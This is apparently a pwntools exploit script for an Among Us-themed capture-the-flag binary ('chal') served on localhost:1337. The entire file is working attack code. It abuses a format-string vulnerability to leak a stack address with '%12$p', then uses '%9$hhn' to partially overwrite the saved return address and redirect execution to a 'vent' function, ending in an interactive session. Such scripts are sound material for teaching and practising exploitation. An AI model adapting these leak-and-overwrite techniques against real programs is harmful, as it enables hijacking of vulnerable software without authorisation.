
from pwn import *

e = ELF("chal")

context.binary = e


def setup():
    # p = process()
    p = remote("localhost",1337)
    return p

def setup_bof(p, first=True):
    for i in range(7):
        p.sendlineafter(">", "1")
        p.sendline("among")
    p.sendlineafter(">", "1")
    if first:
        p.sendline("aa")
    else:
        # Account for initial Impostor
        p.sendline(b"a"*13)
    p.sendlineafter(">", "1")


if __name__ == '__main__':
    p = setup()
    

    setup_bof(p)
    # 1. leak stack
    p.sendline("%12$p redblue")
    l = p.recvuntil("blue")
    leak = int(l[l.index(b"0x")+2:l.index(b"0x")+14],16)
    print(hex(leak))

    # 2. Write number of characters required for overwriting return addr
    setup_bof(p, first=False)
    target = (e.sym.vent & 0xff)-1 # -1 cos newline
    p.sendline(f"%{target}c")

    # 3. Write ret addr
    p.sendlineafter(">", "1")
    p.sendline("%9$hhn")
    p.sendlineafter(">", "1")
    p.sendline(b"orangeaa"+p64(leak-24))



    p.interactive()
